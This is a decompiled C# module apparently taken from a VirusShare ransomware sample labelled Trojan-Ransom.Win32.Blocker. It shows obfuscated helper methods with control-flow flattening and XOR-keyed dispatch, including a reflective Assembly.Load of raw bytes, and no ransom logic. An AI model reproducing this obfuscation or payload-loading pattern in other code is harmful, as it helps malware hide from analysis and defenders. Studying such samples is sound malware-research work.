// Decompiled with JetBrains decompiler
// Type: Ⴃ.Ⴃ
// Assembly: Final, Version=3.19.0.1745, Culture=neutral, PublicKeyToken=null
// MVID: 912F5519-7248-44E3-B098-F33E871EBECC
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.aitk-30127cc094a284d2b7badec68076f9f82c11bf424936b29e96d1d35a5ad4f898.exe

using Final.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.ComponentModel.Design;
using System.Configuration;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Ⴃ
{
  [HideModuleName]
  [StandardModule]
  internal sealed class Ⴃ
  {
    [HelpKeyword("My.Settings")]
    internal static MySettings Ⴃ => MySettings.Default;

    static Ⴃ() => MyComputer.ႨႨ();

    internal static SettingsBase Ⴈ([In] SettingsBase obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 29:
          num1 = 6;
          break;
        default:
          num1 = 7;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
            num2 = 1;
            continue;
          case 1:
            goto label_3;
          case 2:
          case 3:
          case 5:
          case 6:
            goto label_8;
          case 7:
            num2 = 1;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.Ⴃ.Ⴈ);
            num2 = 1;
            continue;
        }
      }
label_8:
      return SettingsBase.Synchronized(obj0);
    }

    internal static void Ⴐ(
      [In] WindowsFormsApplicationBase obj0,
      [In] ShutdownEventHandler obj1,
      [In] int obj2,
      [In] int obj3)
    {
      int num1 = 4;
      while (true)
      {
        switch (num1)
        {
          case 0:
            num1 = 4;
            continue;
          case 1:
          case 5:
            goto label_7;
          case 2:
            goto label_8;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 123:
                num2 = 1;
                break;
              default:
                num2 = 0;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      obj0.Shutdown += obj1;
    }

    internal static bool Ⴅ([In] Hashtable obj0, [In] object obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 106:
          num1 = 2;
          break;
        default:
          num1 = 6;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 1:
            goto label_3;
          case 2:
          case 3:
            goto label_8;
          case 5:
            num2 = 0;
            continue;
          case 6:
          case 7:
            num2 = 0;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.Ⴃ.Ⴅ);
            num2 = 0;
            continue;
        }
      }
label_8:
      return obj0.ContainsKey(obj1);
    }

    internal static Assembly Ⴍ([In] byte[] obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 44:
          num1 = 3;
          break;
        default:
          num1 = 7;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 1:
            goto label_3;
          case 2:
            num2 = 0;
            continue;
          case 3:
          case 5:
            goto label_8;
          case 6:
          case 7:
            num2 = 0;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.Ⴃ.Ⴍ);
            num2 = 0;
            continue;
        }
      }
label_8:
      return Assembly.Load(obj0);
    }

    internal static string Ⴀ([In] System.Type obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 13:
          num1 = 5;
          break;
        default:
          num1 = 7;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 1:
          case 6:
          case 7:
            num2 = 4;
            continue;
          case 3:
            num2 = 4;
            continue;
          case 4:
            goto label_3;
          case 5:
            goto label_8;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴃ.Ⴃ.Ⴀ);
            num2 = 4;
            continue;
        }
      }
label_8:
      return obj0.FullName;
    }

    internal static void Ⴗ([In] Control obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 5;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 1:
          case 2:
            goto label_7;
          case 3:
          case 4:
            num1 = 5;
            continue;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 115:
                num2 = 0;
                break;
              default:
                num2 = 3;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      obj0.Name = obj1;
    }

    internal static void Ⴓ([In] Label obj0, [In] bool obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 4;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_8;
          case 1:
          case 3:
            num1 = 4;
            continue;
          case 2:
            goto label_7;
          case 5:
            goto label_9;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 111:
                num2 = 2;
                break;
              default:
                num2 = 3;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_9:
      return;
label_7:
      obj0.AutoSize = obj1;
    }

    internal static void Ⴜ([In] Label obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 4;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 2:
          case 3:
            num1 = 4;
            continue;
          case 1:
            goto label_7;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 18:
                num2 = 1;
                break;
              default:
                num2 = 3;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      obj0.Text = obj1;
    }
  }
}
